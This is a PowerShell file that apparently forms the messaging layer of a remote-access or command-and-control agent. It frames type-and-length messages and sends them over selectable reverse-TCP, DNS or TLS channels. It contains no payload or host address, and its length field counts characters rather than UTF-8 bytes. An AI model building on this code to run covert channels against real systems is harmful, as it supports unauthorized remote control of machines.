$MESSAGE_HEADER_LEN = 5

function Message-Create {
    <#
        .SYNOPSIS
        create a new message from these fields
        .PARAMETER MType
        type field of the message
        .PARAMETER Content
        content
    #>
    param(
        [Parameter(Mandatory=$true)]
        [Byte]
        $MType,

        [Parameter(Mandatory=$true)]
        [String]
        $Content
    )

	$len1 = $Content | Measure-Object -Character;
	$len2 = $len1.Characters
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'leng' = $len2
       'content' = $Content
    }
}

function Message-SendToTransport([PSObject] $msg, [PSObject] $transport) {
	$len = [System.Net.IPAddress]::HostToNetworkOrder([Int32]$msg.leng)
	$data = New-Object byte[]($msg.leng+5)
	$data[0] = [byte] $msg.mtype
	$lendata = [BitConverter]::GetBytes([Int32] $len)
	for ($i=0; $i -lt $lendata.Length; ++$i) {
	    $data[1+$i] = $lendata[$i]
	}
	$textdata = [System.Text.Encoding]::UTF8.GetBytes($msg.content)
	for ($i=0; $i -lt $textdata.Length; ++$i) {
	    $data[5+$i] = $textdata[$i]
	}

    Send-ToTransport $transport $data
}

function Message-ParseFromTransport([PSObject] $transport) {
    $buf = Receive-FromTransport $transport $MESSAGE_HEADER_LEN
    
	$MType = [Byte] $buf[0]
	$leng = [Int32][BitConverter]::ToInt32($buf, 1)
	$leng = [System.Net.IPAddress]::NetworkToHostOrder([Int32]$leng)

    $Content = Receive-FromTransport $transport $leng
    $Content = [System.Text.Encoding]::UTF8.GetString($Content)
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'leng' = $leng
       'content' = $Content
    }
}

function Send-ToTransport([PSObject] $transport, $data) {
    if ($CHANNELENCRYPTION -eq "NONE") {
        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
            $buf = Transport-ReverseTcp-Send $transport $data
        } elseif ($CONNECTIONMETHOD -eq "DNS") {
            $buf = Transport-Dns-Send $transport $data
        }
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Send $transport $data
    }
}

function Receive-FromTransport([PSObject] $transport, [Int32] $leng) {
    if ($CHANNELENCRYPTION -eq "NONE") {
        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
            $buf = Transport-ReverseTcp-Receive $transport $leng
        } elseif ($CONNECTIONMETHOD -eq "DNS") {
            $buf = Transport-Dns-Receive $transport $leng
        }
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Receive $transport $leng
    }
    return $buf
}
